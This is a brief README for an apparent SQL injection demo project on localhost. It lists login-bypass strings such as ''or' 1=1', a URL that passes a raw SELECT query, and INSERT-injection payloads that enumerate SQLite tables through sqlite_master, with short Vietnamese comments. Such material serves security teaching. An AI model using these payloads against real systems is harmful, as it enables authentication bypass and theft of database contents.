# sql-injections-demo
Try these, some basic login field injections.
username: 'or' 1=1
password: 'or' 1=1

username: 1' 1=1 --
password: anything

For get all data

http://localhost:3000/page?id=SELECT%20*%20FROM%20data

INSERT INEJCTION 
name: test', 'test1')-- -
description: anything

// Dem so luong database
test', (SELECT count(tbl_name) FROM sqlite_master))-- -

// Lay do dai database
test', (SELECT length(tbl_name) FROM sqlite_master))-- -

test', (SELECT tbl_name FROM sqlite_master)-- -